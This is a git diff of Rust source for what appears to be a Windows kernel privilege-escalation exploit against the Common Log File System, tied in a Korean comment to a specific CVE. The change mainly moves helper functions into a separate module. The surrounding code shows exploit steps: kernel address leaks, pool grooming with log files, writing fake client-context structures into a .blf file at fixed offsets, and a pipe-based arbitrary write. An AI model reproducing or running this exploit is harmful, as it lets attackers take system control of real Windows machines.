@@ -39,10 +39,8 @@ use windows_sys::Win32::System::Registry::{
 
 use std::mem::offset_of;
 
-/*
-문제의 부분?
-*/
 mod ntdll;
+mod helper;
 
 use ntdll::system_infomation::{
     big_pool::{
@@ -69,36 +67,7 @@ use ntdll::extern_raw::{
 };
 
 use ntdll::pipeline::{PipeAttribute, ListEntry};
-
-
-fn append(base: &OsStr, suffix: &str) -> OsString {
-    let mut result = base.to_os_string();
-    result.push(suffix);
-    result
-}
-
-fn wide(s: &str) -> Vec<u16> {
-    s.encode_utf16()
-        .chain(std::iter::once(0))
-        .collect()
-}
-
-fn osstr_wide(s: &OsStr) -> Vec<u16> {
-    s.encode_wide()
-        .chain(std::iter::once(0))
-        .collect()
-}
-
-fn nt_success(status: NTSTATUS) -> bool {
-    status >= 0
-}
-
-fn patch(file: &mut std::fs::File, offset: u64, data: &[u8]) -> std::io::Result<()> {
-    file.seek(SeekFrom::Start(offset))?;
-    file.write_all(data)?;
-    Ok(())
-}
-
+use helper::{str_helper, nt_helper};
 
 #[derive(Debug)]
 struct LogPaths {
@@ -151,8 +120,8 @@ struct ProcessTable{
 
 //token 오프셋만 반환하는 형태로
 fn get_os_version() -> Result< usize, u32> {
-    let path = wide(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
-    let value_name = wide("CurrentBuild");
+    let path = str_helper::wide(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
+    let value_name = str_helper::wide("CurrentBuild");
 
     let mut hkey: HKEY = null_mut();
 
@@ -260,7 +229,7 @@ fn get_object_kernel_address(object: HANDLE) -> Option<usize> {
             continue;
         }
 
-        if !nt_success(status) {
+        if !nt_helper::nt_success(status) {
             return None;
         }
 
@@ -371,7 +340,7 @@ fn check_access_token(pt: &mut ProcessTable) {
             continue;
         }
 
-        if !nt_success(status) {
+        if !nt_helper::nt_success(status) {
             println!(
                 "[!] NtQuerySystemInformation failed: {:#x}",
                 status as u32
@@ -421,9 +390,9 @@ fn create_initial_log_file() -> io::Result<LogPaths> {
     let mut log_root = OsString::from("LOG:");
     log_root.push(&public);
 
-    let log_name = append(&log_root, r"\MyLog");
-    let log_file = append(&public, r"\MyLog.blf");
-    let xlog_name = append(&log_root, r"\MyLxg");
+    let log_name = str_helper::append(&log_root, r"\MyLog");
+    let log_file = str_helper::append(&public, r"\MyLog.blf");
+    let xlog_name = str_helper::append(&log_root, r"\MyLxg");
 
     let id = SystemTime::now()
         .duration_since(UNIX_EPOCH)
@@ -431,12 +400,12 @@ fn create_initial_log_file() -> io::Result<LogPaths> {
         .subsec_nanos();
     
 
-    let frist_container = append(&public, &format!(r"\.container_1{id}"));
-    let second_container = append(&public, &format!(r"\.container_1{}", id.wrapping_add(1)));
+    let frist_container = str_helper::append(&public, &format!(r"\.container_1{id}"));
+    let second_container = str_helper::append(&public, &format!(r"\.container_1{}", id.wrapping_add(1)));
 
     println!("[+] Container id: {id}");
 
-    let log_name_w = osstr_wide(&log_name);
+    let log_name_w = str_helper::osstr_wide(&log_name);
 
     let log_handle = unsafe {
         CreateLogFile(
@@ -523,8 +492,8 @@ fn get_offset_between_pool(logpath: &LogPaths) -> Option<GroomingRes>{
 
     const DELETE_ACCESS: u32 = 0x0001_0000;
     loop{
-        let new_log_name = append(&logpath.trigger_log, &format!(r"{name_cnt}"));
-        let log_name_w = osstr_wide(&new_log_name);
+        let new_log_name = str_helper::append(&logpath.trigger_log, &format!(r"{name_cnt}"));
+        let log_name_w = str_helper::osstr_wide(&new_log_name);
         grooming_res.log_handle = unsafe {
             CreateLogFile(
                 log_name_w.as_ptr(),
@@ -720,15 +689,15 @@ fn create_file(logpath: &LogPaths, distance: usize) -> std::io::Result<()> {
         .write(true)
         .open(&logpath.trigger_blf)?;
 
-    patch(&mut file, 0x80c, &checksum)?;
-    patch(&mut file, 0x868, &signature_offset)?;
-    patch(&mut file, 0x9a8, &cc_offset_array)?;
-    patch(&mut file, 0x1b98, &cb_symbol_zone)?;
-    patch(&mut file, 0x2390, &block_name_offset)?;
-    patch(&mut file, 0x2394, &block_attribute_offset)?;
-    patch(&mut file, 0x23a0, &fake_client_context)?;
-    patch(&mut file, 0x23ab, &fake_client_context2)?;
-    patch(&mut file, 0x2418, &fake_client_context3)?;
+    str_helper::patch(&mut file, 0x80c, &checksum)?;
+    str_helper::patch(&mut file, 0x868, &signature_offset)?;
+    str_helper::patch(&mut file, 0x9a8, &cc_offset_array)?;
+    str_helper::patch(&mut file, 0x1b98, &cb_symbol_zone)?;
+    str_helper::patch(&mut file, 0x2390, &block_name_offset)?;
+    str_helper::patch(&mut file, 0x2394, &block_attribute_offset)?;
+    str_helper::patch(&mut file, 0x23a0, &fake_client_context)?;
+    str_helper::patch(&mut file, 0x23ab, &fake_client_context2)?;
+    str_helper::patch(&mut file, 0x2418, &fake_client_context3)?;
     Ok(())
 }
 
@@ -983,7 +952,7 @@ fn pipe_arbitrary_write(
 
     }
 
-    let log_name_w = osstr_wide(&log_path.trigger_log);
+    let log_name_w = str_helper::osstr_wide(&log_path.trigger_log);
 
     const DELETE_ACCESS: u32 = 0x0001_0000;
 
@@ -1008,7 +977,7 @@ fn pipe_arbitrary_write(
 
     let mut lxg_name = log_path.secondary_log_prefix.clone();
     lxg_name.push(format!("{suffix:05}"));
-    let lxg_name_w = osstr_wide(&lxg_name);
+    let lxg_name_w = str_helper::osstr_wide(&lxg_name);
 
     //정상 blf 로드, 공격받을 blf
     let valid_log_handle = unsafe {
@@ -1031,7 +1000,7 @@ fn pipe_arbitrary_write(
         &log_path.container_second_try
     };
 
-    let container_path_wide: Vec<u16> = osstr_wide(container_path);
+    let container_path_wide: Vec<u16> = str_helper::osstr_wide(container_path);
     
     let result = unsafe {
         AddLogContainer(
@@ -1048,7 +1017,7 @@ fn pipe_arbitrary_write(
     }
 
     pcb_container = 512;
-    let pin_container = osstr_wide(&log_path.container_first_try);
+    let pin_container = str_helper::osstr_wide(&log_path.container_first_try);
 
     //손상 컨테이너 생성 -> 이번 cve에 한정된 rootcause
     //일반적으로 경로 재활용을 하지 않음
